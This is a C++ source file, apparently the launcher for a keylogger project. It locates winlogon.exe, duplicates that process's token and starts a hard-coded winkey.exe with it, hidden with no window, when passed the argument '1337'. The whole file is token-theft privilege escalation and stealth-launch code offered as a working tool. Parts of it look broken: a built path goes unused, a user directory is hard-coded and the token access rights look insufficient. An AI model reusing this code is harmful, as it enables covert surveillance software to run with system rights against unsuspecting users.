#include "winkey.h"
#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <string.h>
#include <iostream>
#include <psapi.h>



PROCESS_INFORMATION winkeyPI;


DWORD GetPidByName()
{
    char* filename = "winlogon.exe";
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(PROCESSENTRY32);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            CloseHandle(hSnapShot);
            return(pEntry.th32ProcessID);
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
    return(0);
}

void    Tinky_Winky() {
    DWORD winlogonPID;
    HANDLE wlPH;
    HANDLE wlTH;
    HANDLE newExecToken;
    char Path[260];
    LPWSTR PP = L"C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";

    winlogonPID = GetPidByName();
    wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
    if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
        printf("opt\n");
    }
    CloseHandle(wlPH);
    if (!DuplicateTokenEx(wlTH, TOKEN_DUPLICATE, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
        printf("dtEx\n");
    }
    CloseHandle(wlTH);
    GetCurrentDirectory(260, Path);
    strcat(Path, "\\winkey.exe 1337");
    int i = 0;

    if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
        printf("cpwt\n");
    }
}

int main(int ac, char **av) {
    char* pass = "1337";
    if (ac == 2 && !strcmp(av[1], "1337")) {
        Tinky_Winky();
        return 0;
    }
    GetPidByName();
    while (1);
    return 0;
}